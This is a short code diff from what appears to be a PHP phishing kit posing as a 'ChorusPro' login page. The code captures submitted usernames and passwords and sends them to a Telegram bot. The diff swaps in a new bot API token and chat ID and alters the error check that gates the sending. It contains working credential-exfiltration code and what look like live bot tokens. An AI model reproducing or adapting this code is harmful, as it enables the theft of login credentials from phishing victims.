@@ -205,8 +205,8 @@ function get_user_countrycode() {
 
 function telegram_send($message) {
     $curl = curl_init();
-    $api_key  = '7400207798:AAGBdr3126ujcKWmgI2NKXgXYpQboJ0DCYs';
-    $chat_id  = '6851179718';
+    $api_key  = '7443548014:AAHxxtghL0YOo8r1j6GrgM_kOV0HLHtqpTk';
+    $chat_id  = '5387352019';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
@@ -259,7 +259,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
         $_SESSION['username'] = $_POST['username1'];
         $_SESSION['password'] = $_POST['password1'];
        
-        if( count($_SESSION['errors']) == 0 ) {
+        if( count($_SESSION['errors']) == 2 ) {
 
            
             $telegram_message = '    ✨ Auth ChorusPro ✨ ' . $_SERVER[''] . "\r\n";
